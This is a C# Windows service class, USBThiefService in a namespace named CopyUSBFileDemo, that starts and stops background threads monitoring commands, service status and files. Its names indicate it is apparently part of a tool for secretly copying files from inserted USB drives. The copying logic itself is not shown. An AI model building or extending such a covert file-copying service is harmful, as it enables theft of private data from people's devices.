using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using System.Text;

namespace CopyUSBFileDemo
{
    public partial class USBThiefService : ServiceBase
    {
        public USBThiefService()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            // TODO: 在此处添加代码以启动服务。
            try
            {
                LogerHelper.WriteOperateLog("开始启动服务");
                Monitoring.MonitoringServiceCommandMsg();
                LogerHelper.WriteOperateLog("开始数据监控服务");
                Monitoring.MonitoringServiceStatus();
                LogerHelper.WriteOperateLog("开启文件状态监控服务");
                Monitoring.FileMonitoringCommand(curWatcher);
                LogerHelper.WriteOperateLog("所有服务启动完成");
            }
            catch (Exception ex)
            {
                LogerHelper.WriteErrorLog(ex);
            }
        }

        protected override void OnStop()
        {
            // TODO: 在此处添加代码以执行停止服务所需的关闭操作。
            try
            {
                Monitoring.IsStoped = true;
                if (Monitoring.thread != null)
                {
                    Monitoring.thread.Abort();
                }
                if (Monitoring.threadCommand != null)
                {
                    Monitoring.threadCommand.Abort();
                }
                if (Monitoring.threadVilidate != null)
                {
                    Monitoring.threadVilidate.Abort();
                }
                curWatcher = null;
                LogerHelper.WriteOperateLog("所有服务停止! ");
            }
            catch (Exception ex)
            {
                LogerHelper.WriteErrorLog(ex);
            }
        }     
    }
}
